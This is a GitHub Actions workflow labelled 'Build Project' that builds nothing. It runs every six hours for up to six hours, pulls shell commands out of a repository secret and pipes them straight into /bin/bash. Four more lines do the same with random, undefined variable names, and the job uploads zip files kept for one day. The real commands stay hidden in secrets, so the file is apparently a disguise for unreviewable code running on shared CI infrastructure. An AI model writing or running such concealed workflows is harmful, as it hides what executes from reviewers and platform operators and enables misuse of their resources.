name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '15 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Start
        env:
          vve0510: ${{ secrets.vve0510 }}
        run: |
          printf '%s' "$vve0510" | jq -r .ys1885 | /bin/bash
          echo $oj18 | jq -r .qud2316 | /bin/bash
          echo $apy582 | jq -r .oyu648 | /bin/bash
          echo $cuex713 | jq -r .pws24239 | /bin/bash
          printf '%s' "$pipq6" | jq -r .qlyht31 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: TcbMF3E5
          path: "*.zip"
          retention-days: 1
